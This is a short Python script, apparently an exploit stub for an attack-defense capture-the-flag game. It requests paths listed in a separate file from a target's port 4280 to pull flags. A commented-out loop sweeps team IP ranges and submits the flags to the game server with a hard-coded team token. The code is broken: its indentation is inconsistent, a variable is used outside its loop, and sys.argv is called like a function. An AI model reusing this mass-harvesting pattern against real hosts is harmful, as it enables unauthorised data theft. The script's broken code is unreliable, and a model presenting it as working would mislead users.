#!/usr/bin/env python3

# from lxml import html
import requests, time, sys


# from termcolor import colored
# from datetime import *
def pwn(ip):
	names = open('works.txt', 'r+')
	names_list = names.readlines()
	# print(names_list)
	for name in names_list:
		# print(name)
	    page1 = requests.get('http://{}:4280{}'.format(ip, name), timeout=5)
	    page2 = requests.get('http://{}:4280{}'.format(ip, name), timeout=5)


    cont = page2.content
    cont = str(cont)
    cont = cont.strip("b'")
    cont = cont.strip("'")
    # print(cont)
    return (cont)


# def throw():
#     for x in range(255):
#         ip = '10.60.' + str(x) + '.2'
#         ip2 = '10.61.' + str(x) + '.2'
#         flag1 = main(ip)
#         flag2 = main(ip2)
#         r = requests.put('http://monitor.ructfe.org/flags', data='[' + flag1 + ',' + flag2 + ']',
#                          json={'X-Team-Token:2e059bcd-ff85-4142-af4d-906b46840428'})


if __name__ == '__main__':
    pwn(sys.argv(1))

# pwn(11)